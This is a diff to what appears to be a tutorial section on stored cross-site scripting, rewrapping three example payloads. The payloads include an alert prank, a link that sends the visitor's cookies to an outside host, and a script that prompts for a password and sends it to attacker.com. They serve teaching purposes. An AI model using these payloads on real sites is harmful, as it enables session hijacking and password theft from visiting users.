@@ -60,13 +60,17 @@ In a stored XSS attacked, the input is actually displayed to all other users tha
 The following examples could be used to compromise visiting users.
 
 ```
-<a onmouseover="alert('just kidding, youve been pwned')">Hello I am just an innocent comment</a>
+<a onmouseover="alert('just kidding, youve been pwned')">Hello I am 
+just an innocent comment</a>
 ```
 
 ```
-<a href=“youtube.com” onmouseover='window.location="http://simeonkakpovi.com?content="+document.cookie'>Hello I am just an innocent comment</a>
+<a href=“youtube.com” onmouseover='window.location="http://simeonkakpovi.com
+?content="+document.cookie'>Hello I am just an innocent comment</a>
 ```
 
 ```
-<script>alert("We need your password!");password=prompt("Enter password...","");document.location="http://attacker.com/catch.php?password="+encodeURI(password);</script>
+<script>alert("We need your password!");password=prompt("Enter
+password...","");document.location="http://attacker.com/catch.php
+?password="+encodeURI(password);</script>
 ```
